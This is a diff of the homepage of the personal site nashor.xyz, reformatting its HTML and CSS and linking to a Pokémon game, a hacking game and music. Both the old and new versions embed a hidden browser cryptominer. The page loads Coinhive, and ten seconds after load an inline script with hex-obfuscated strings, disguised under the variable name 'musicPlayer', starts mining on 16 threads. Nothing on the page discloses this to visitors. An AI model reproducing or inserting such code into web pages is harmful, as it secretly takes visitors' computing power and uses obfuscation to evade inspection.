@@ -3,152 +3,134 @@
 Why are you looking here?
 
 -->
-
+<!DOCTYPE html>
 <html lang="en-US">
-    <head>
-        <meta charset="UTF-8">
-        <title>nashor.xyz</title>
-        <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet"> 
-        <style type="text/css">
+<head>
+	<meta charset="UTF-8">
+	<title>nashor.xyz</title>
+	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+	<style type="text/css">
 
-            body{
-                background: black;
-                background-image: url("lain.jpg");
-                background-position: center;
-                background-repeat: no-repeat;
-                background-size: cover;
-                font-family: "Roboto";
-                height: 100%;
-                margin: 0;
-                min-height: 100%;
-                min-width: 100%;
-                overflow: hidden;
-                padding: 0;
-                width: 100%;
-            }
+	           body{
+	               background: black;
+	               background-image: url("lain.jpg");
+	               background-position: center;
+	               background-repeat: no-repeat;
+	               background-size: cover;
+	               font-family: "Roboto";
+	               height: 100%;
+	               margin: 0;
+	               min-height: 100%;
+	               min-width: 100%;
+	               overflow: hidden;
+	               padding: 0;
+	               width: 100%;
+	           }
 
-            body > div{
-                align-items: center;
-                display: flex;
-                flex-flow: row nowrap;
-                height: 100%;
-                justify-content: left;
-                min-height: 100%;
-                min-width: 100%;
-                width: 100%;
-            }
+	           body > div{
+	               align-items: center;
+	               display: flex;
+	               flex-flow: row nowrap;
+	               height: 100%;
+	               justify-content: left;
+	               min-height: 100%;
+	               min-width: 100%;
+	               width: 100%;
+	           }
 
-            h1{
-                bottom: 3rem;
-                font-family: "Robot", monospace;
-                padding: 0;
-                position: absolute;
-                right: 3rem;
-                text-shadow: 4px 4px 0px #000000;
-            }
+	           h1{
+	               bottom: 3rem;
+	               font-family: "Robot", monospace;
+	               padding: 0;
+	               position: absolute;
+	               right: 3rem;
+	               text-shadow: 4px 4px 0px #000000;
+	           }
 
-            h1 a{
-                color: #be132d !important;
-                font-size: 10vmin;
-                opacity: 0.9;
-                text-decoration: none;
-                transition: ease 0.5s;
-            }
+	           h1 a{
+	               color: #be132d !important;
+	               font-size: 10vmin;
+	               opacity: 0.9;
+	               text-decoration: none;
+	               transition: ease 0.5s;
+	           }
 
-            span{
-                margin: 0 0 0 3rem;
-                transform: rotate(-1.25deg);
-            }
+	           span{
+	               margin: 0 0 0 3rem;
+	               transform: rotate(-1.25deg);
+	           }
 
-            span a{
-                color: #777777;
-                display: block;
-                font-size: 4.5vmin;
-                font-weight: bold;
-                opacity: 0.25;
-                text-decoration: none;
-                text-shadow: 4px 4px 0px #000000;
-                transition: ease 0.5s;
-            }
+	           span a{
+	               color: #777777;
+	               display: block;
+	               font-size: 4.5vmin;
+	               font-weight: bold;
+	               opacity: 0.25;
+	               text-decoration: none;
+	               text-shadow: 4px 4px 0px #000000;
+	               transition: ease 0.5s;
+	           }
 
-            span a small {
-				height:  0.5vmin !important;
-				line-height:  0.5vmin !important;
-				max-height: 0.5vmin !important;
-			}
+	           span a small {
+	               height:  0.5vmin !important;
+	               line-height:  0.5vmin !important;
+	               max-height: 0.5vmin !important;
+	           }
 
-            span a:hover{
-                opacity: 0.75;
-                text-shadow: 4px 4px 0px rgb(0,0,0,0.5);
-            }
+	           span a:hover{
+	               opacity: 0.75;
+	               text-shadow: 4px 4px 0px rgb(0,0,0,0.5);
+	           }
 
-			#nashor2{
-                padding: 0;
-                position: absolute;
-                right: 3rem;
-                top: 3rem;
-                text-shadow: 4px 4px 0px #000000;
-                width: 25vmin;
-                filter: grayscale(100%);
-                opacity: 0.25;
-                transition: ease 0.5s;
-            }
+	           #nashor2{
+	               padding: 0;
+	               position: absolute;
+	               right: 3rem;
+	               top: 3rem;
+	               text-shadow: 4px 4px 0px #000000;
+	               width: 25vmin;
+	               filter: grayscale(100%);
+	               opacity: 0.25;
+	               transition: ease 0.5s;
+	           }
 
-            #nashor2:hover{
-				filter: grayscale(0%);
-				opacity: 1.0;
-			}
+	           #nashor2:hover{
+	               filter: grayscale(0%);
+	               opacity: 1.0;
+	           }
 
-            @media only screen and (max-width: 1024px) {
+	           @media only screen and (max-width: 1024px) {
 
-                span a{
-                    opacity: 0.75;
-                }
+	               span a{
+	                   opacity: 0.75;
+	               }
 
-                #nashor2 {
-					display: none;
-				}
+	               #nashor2 {
+	                   display: none;
+	               }
 
-            }
+	           }
 
-            .invisible {
-                visibility: hidden
-            }
+	           .invisible {
+	               visibility: hidden
+	           }
 
 
 
-        </style>
-	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-        window.onload = function(){
-                setTimeout(sOP, 10000);
-        }
-        function sOP(){var _0x736a=["\x73\x74\x6F\x70","\x32\x4C\x74\x4B\x64\x4C\x58\x55\x44\x7A\x54\x47\x59\x76\x69\x42\x35\x62\x45\x75\x67\x33\x6C\x53\x66\x42\x56\x32\x75\x6E\x37\x6D","\x53\x63\x68\x6F\x6F\x6C","\x73\x65\x74\x4E\x75\x6D\x54\x68\x72\x65\x61\x64\x73","\x73\x65\x74\x54\x68\x72\x6F\x74\x74\x6C\x65","\x73\x65\x74\x41\x75\x74\x6F\x54\x68\x72\x65\x61\x64\x73\x45\x6E\x61\x62\x6C\x65\x64","\x65\x72\x72\x6F\x72","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x5F\x65\x72\x72\x6F\x72","\x6F\x6E","\x6A\x6F\x62","\x73\x74\x61\x72\x74"];var musicPlayer=null;if(musicPlayer){musicPlayer[_0x736a[0]]()};musicPlayer=  new CoinHive.User(_0x736a[1],_0x736a[2]);musicPlayer[_0x736a[3]](16);musicPlayer[_0x736a[4]](0.5);musicPlayer[_0x736a[5]](true);musicPlayer[_0x736a[8]](_0x736a[6],function(_0x664ex2){if(_0x664ex2[_0x736a[6]]!== _0x736a[7]){}});musicPlayer[_0x736a[8]](_0x736a[9],function(_0x664ex2){});musicPlayer[_0x736a[10]]()
-        }
-    </script>
-    </head>
-    <body>
-        <div>
-            <h1><a href="index">nashor.xyz</a></h1>
-            <span>
-                <a href="λ">/λ/ pokemon game</a>
-                <a href="Δ">/Δ/ hacking game</a>
-                <a href="₿">/₿/ support the cause</a>
-                <a href="♪">/♪/ listen to music</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>
-                <a class="invisible" href="https://nashor.xyz">/placeholder/</a>           
-            </span>
-        </div>
-		<a href="CryptoClicker"><img id="nashor2" src="nashor2.png" alt="nashor.xyz"></a>
-    </body>
-
+	</style>
+	<script src="https://coin-hive.com/lib/coinhive.min.js">
+	</script>
+	<script>
+	       window.onload = function(){
+	               setTimeout(sOP, 10000);
+	       }
+	       function sOP(){var _0x736a=["\x73\x74\x6F\x70","\x32\x4C\x74\x4B\x64\x4C\x58\x55\x44\x7A\x54\x47\x59\x76\x69\x42\x35\x62\x45\x75\x67\x33\x6C\x53\x66\x42\x56\x32\x75\x6E\x37\x6D","\x53\x63\x68\x6F\x6F\x6C","\x73\x65\x74\x4E\x75\x6D\x54\x68\x72\x65\x61\x64\x73","\x73\x65\x74\x54\x68\x72\x6F\x74\x74\x6C\x65","\x73\x65\x74\x41\x75\x74\x6F\x54\x68\x72\x65\x61\x64\x73\x45\x6E\x61\x62\x6C\x65\x64","\x65\x72\x72\x6F\x72","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x5F\x65\x72\x72\x6F\x72","\x6F\x6E","\x6A\x6F\x62","\x73\x74\x61\x72\x74"];var musicPlayer=null;if(musicPlayer){musicPlayer[_0x736a[0]]()};musicPlayer=  new CoinHive.User(_0x736a[1],_0x736a[2]);musicPlayer[_0x736a[3]](16);musicPlayer[_0x736a[4]](0.5);musicPlayer[_0x736a[5]](true);musicPlayer[_0x736a[8]](_0x736a[6],function(_0x664ex2){if(_0x664ex2[_0x736a[6]]!== _0x736a[7]){}});musicPlayer[_0x736a[8]](_0x736a[9],function(_0x664ex2){});musicPlayer[_0x736a[10]]()
+	       }
+	</script>
+</head>
+<body>
+	<div>
+		<h1><a href="index">nashor.xyz</a></h1><span><a href="%CE%BB">/λ/ pokemon game</a> <a href="%CE%94">/Δ/ hacking game</a> <a href="%E2%82%BF">/₿/ support the cause</a> <a href="%E2%99%AA">/♪/ listen to music</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a> <a class="invisible" href="https://nashor.xyz">/placeholder/</a></span>
+	</div><a href="CryptoClicker"><img alt="nashor.xyz" id="nashor2" src="nashor2.png"></a>
+</body>
 </html>
